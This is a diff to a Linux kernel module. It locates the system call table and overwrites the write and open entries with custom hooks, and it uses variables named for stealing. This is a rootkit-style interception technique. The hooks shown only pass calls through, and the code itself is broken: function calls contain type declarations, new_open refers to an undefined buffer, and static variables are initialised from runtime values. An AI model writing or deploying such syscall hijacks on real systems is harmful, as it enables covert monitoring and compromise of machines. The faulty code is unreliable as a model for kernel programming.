@@ -22,11 +22,14 @@ MODULE_VERSION("0.1");
 
 #define SYS_CALL_TABLE "sys_call_table"
 #define SYSCALL_NI __NR_write
+#define SYSCALL_NA __NR_open
 
 static ulong *syscall_table = NULL;
-static void *original_syscall = NULL;
+static void *original_write = NULL;
+static void *original_open = NULL;
 
 asmlinkage int (*old_write)(int fildes, const void *buf, size_t nbytes);
+asmlinkage int (*old_open)(const char *filename, int flags, int mode);
 
 char *buff;
 int buff_length;
@@ -57,6 +60,7 @@ static unsigned long new_write(int fildes, const void *buf, size_t nbytes)
 {
 
 	static char buffer[nbytes];
+ 	static int steal_dest = fildes;
 
         if (copy_from_user(buffer, buf, nbytes)) {
                 return -EFAULT;
@@ -64,6 +68,21 @@ static unsigned long new_write(int fildes, const void *buf, size_t nbytes)
         buffer[nbytes-1] = 0;
 
         return (*old_write)(int fildes, const void *buf, size_t nbytes);
+}
+
+static unsigned long new_open(const char *filename, int flags, int mode)
+{
+
+	static char buffer[100];
+	static int steal_flags = flags;
+	static int detect_mode = mode;
+
+        if (copy_from_user(buffer, buf, 100)) {
+                return -EFAULT;
+        }
+        buffer[99] = 0;
+
+        return (*old_open)(const char *filename, int flags, int mode);
 }
 
 static int is_syscall_table(ulong *p)
@@ -89,7 +108,7 @@ static int page_read_only(ulong address)
         return 0;
 }
 
-static void replace_syscall(ulong offset, ulong func_address)
+static void replace_syscall_write(ulong offset, ulong func_address)
 {
 
         syscall_table = (ulong *)kallsyms_lookup_name(SYS_CALL_TABLE);
@@ -97,7 +116,23 @@ static void replace_syscall(ulong offset, ulong func_address)
 
                 page_read_write((ulong)syscall_table);
 
-                original_syscall = (void *)(syscall_table[offset]);
+                original_write = (void *)(syscall_table[offset]);
+
+                syscall_table[offset] = func_address;
+
+                page_read_only((ulong)syscall_table);
+        }
+}
+
+static void replace_syscall_open(ulong offset, ulong func_address)
+{
+
+        syscall_table = (ulong *)kallsyms_lookup_name(SYS_CALL_TABLE);
+        if (is_syscall_table(syscall_table)) {
+
+                page_read_write((ulong)syscall_table);
+
+                original_open = (void *)(syscall_table[offset]);
 
                 syscall_table[offset] = func_address;
 
@@ -108,7 +143,8 @@ static void replace_syscall(ulong offset, ulong func_address)
 static int init_syscall(void)
 {
         proc_create(procFile, 0, NULL, proc);
-        replace_syscall(SYSCALL_NI, (ulong)new_write);
+        replace_syscall_write(SYSCALL_NI, (ulong)new_write);
+	replace_syscall_open(SYSCALL_NA, (ulong)new_open);
         return 0;
 }
 
@@ -116,7 +152,8 @@ static void cleanup_syscall(void)
 {
         remove_proc_entry(procFile,NULL);
         page_read_write((ulong)syscall_table);
-        syscall_table[SYSCALL_NI] = (ulong)original_syscall;
+        syscall_table[SYSCALL_NI] = (ulong)original_write;
+	syscall_table[SYSCALL_NA] = (ulong)original_open;
         page_read_only((ulong)syscall_table);
 }
 
